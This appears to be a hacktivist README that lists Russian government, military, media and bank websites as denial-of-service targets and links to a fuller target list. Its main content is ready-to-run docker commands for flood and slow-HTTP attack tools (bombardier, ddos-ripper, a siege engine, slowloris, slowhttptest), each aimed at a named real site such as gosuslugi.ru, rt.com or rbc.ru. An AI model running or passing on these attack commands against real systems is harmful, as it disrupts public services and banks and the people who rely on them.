# List of (some) public russian government and military services

https://www.gosuslugi.ru  
https://epp.genproc.gov.ru  
https://ach.gov.ru  
https://www.scrf.gov.ru  
https://mil.ru  
https://minpromtorg.gov.ru/  
https://favt.gov.ru/  
https://rkn.gov.ru/  
https://rg.ru/org/pravitelstvo/minoboroni/gru/  
http://www.fso.gov.ru/  
https://api.developer.sber.ru/product/SberbankID

# Propaganda

```
tvzvezda.ru  
echo.msk.ru  
rg.ru  
kp.ru  
rusvesna.su
```

# Banks

```
https://www.open.ru/
https://nsbank.ru/
https://www.lanta.ru/
https://www.akbars.ru/en/
https://www.bspb.ru/
https://realistbank.ru/
https://skbbank.ru/
https://bbr.ru/
https://domrfbank.ru/
https://kk.bank/
https://www.coalmetbank.ru/
https://bcs-bank.com/
https://www.raiffeisen.ru/
https://energotransbank.com/
https://www.uralsib.ru/
https://alfabank.ru/
https://mosoblbank.ru/
https://smpbank.ru/
https://sberbank.ru/
```

# Bank API

```
https://www.acs.gazprombank.ru/auth/pareq
```

# Full list of targets

https://pastebin.com/JEuV9ftT

# Some examples to start with

```
docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://www.gosuslugi.ru
docker run -it --rm nitupkcuf/ddos-ripper:latest www.rt.com
```

# Awesome python siege engine

```
docker run --rm -it mack/battle-tools python3 -m siege_engine 300 tvzvezda.ru
```

# Awesome Slow DDoS tool

https://github.com/gkbrk/slowloris

Example command:  
```
docker run --rm -it aminvakil/slowloris [-h] [-u DOMAIN] [-s numberOfSockets]
```

# Another awesome similar to slowloris tool 

```
docker run --rm -it shekyan/slowhttptest:latest -c 1000 -X -g -o slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://rbc.ru -p 3 
```
